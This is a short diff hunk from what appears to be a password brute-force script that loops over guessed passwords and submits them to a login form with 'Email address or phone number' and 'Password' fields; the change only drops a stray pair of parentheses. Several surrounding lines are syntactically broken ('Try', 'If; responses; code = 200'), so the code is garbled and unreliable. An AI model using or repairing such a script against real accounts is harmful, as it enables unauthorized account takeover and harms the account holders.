@@ -37,7 +37,7 @@ print("[*] Trying: %s"%password)
 responses = browser.open(post_url)
 Try
 If; responses; code = 200
-browser.select_form(nr=0)()
+browser.select_form(nr=0)
 browser.form['Email address or phone number'] = email
 browser.form['Password'] = file
 response = browser.submit()
